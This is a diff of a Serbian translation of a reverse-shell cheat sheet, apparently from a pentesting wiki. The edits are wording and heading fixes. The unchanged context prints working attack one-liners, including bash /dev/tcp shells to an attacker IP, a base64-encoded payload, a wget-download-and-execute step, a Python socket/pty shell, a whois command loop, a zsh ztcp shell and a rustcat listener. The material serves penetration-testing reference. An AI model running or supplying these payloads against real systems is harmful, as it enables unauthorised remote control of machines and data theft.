@@ -6,7 +6,7 @@
 
 ## Full TTY
 
-**Kada dobijete reverznu ljusku**[ **pročitajte ovu stranicu da biste dobili pun TTY**](full-ttys.md)**.**
+**Kada dobijete reverznu ljusku**[ **pročitajte ovu stranicu da dobijete pun TTY**](full-ttys.md)**.**
 
 ## Bash | sh
 ```bash
@@ -23,7 +23,7 @@ exec >&0
 ```
 Ne zaboravite da proverite sa drugim shell-ovima: sh, ash, bsh, csh, ksh, zsh, pdksh, tcsh i bash.
 
-### Siguran simbol shell
+### Symbol safe shell
 ```bash
 #If you need a more stable connection do:
 bash -c 'bash -i >& /dev/tcp/<ATTACKER-IP>/<PORT> 0>&1'
@@ -36,11 +36,11 @@ echo bm9odXAgYmFzaCAtYyAnYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC44LjQuMTg1LzQ0NDQgMD4mMSc
 
 1. **`bash -i`**: Ovaj deo komande pokreće interaktivni (`-i`) Bash shell.
 2. **`>&`**: Ovaj deo komande je skraćena notacija za **preusmeravanje standardnog izlaza** (`stdout`) i **standardne greške** (`stderr`) na **istu destinaciju**.
-3. **`/dev/tcp/<NAPADAČ-IP>/<PORT>`**: Ovo je posebna datoteka koja **predstavlja TCP vezu sa navedenom IP adresom i portom**.
-- Preusmeravanjem izlaza i grešaka na ovu datoteku, komanda efikasno šalje izlaz interaktivne shell sesije na mašinu napadača.
+3. **`/dev/tcp/<ATTACKER-IP>/<PORT>`**: Ovo je poseban fajl koji **predstavlja TCP vezu sa navedenom IP adresom i portom**.
+- Preusmeravanjem izlaza i tokova grešaka na ovaj fajl, komanda efikasno šalje izlaz interaktivne shell sesije na mašinu napadača.
 4. **`0>&1`**: Ovaj deo komande **preusmerava standardni ulaz (`stdin`) na istu destinaciju kao standardni izlaz (`stdout`)**.
 
-### Kreiraj u datoteci i izvrši
+### Kreiraj u fajlu i izvrši
 ```bash
 echo -e '#!/bin/bash\nbash -i >& /dev/tcp/1<ATTACKER-IP>/<PORT> 0>&1' > /tmp/sh.sh; bash /tmp/sh.sh;
 wget http://<IP attacker>/shell.sh -P /tmp; chmod +x /tmp/shell.sh; /tmp/shell.sh
@@ -124,7 +124,7 @@ Da biste poslali komandu, otkucajte je, pritisnite enter i pritisnite CTRL+D (da
 ```bash
 export X=Connected; while true; do X=`eval $(whois -h <IP> -p <Port> "Output: $X")`; sleep 1; done
 ```
-## Питон
+## Python
 ```bash
 #Linux
 export RHOST="127.0.0.1";export RPORT=12345;python -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("/bin/sh")'
@@ -226,7 +226,7 @@ zsh -c 'zmodload zsh/net/tcp; ztcp <ATTACKER-IP> <PORT>; zsh -i <&$REPLY >&$REPL
 ```
 ## Rustcat (rcat)
 
-[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – moderan netcat-sličan slušalac napisan u Rust-u (pakovan u Kali od 2024).
+[https://github.com/robiot/rustcat](https://github.com/robiot/rustcat) – moderan netcat-sličan slušalac napisan u Rustu (pakovan u Kali od 2024).
 ```bash
 # Attacker – interactive TLS listener with history & tab-completion
 rcat listen -ib 55600
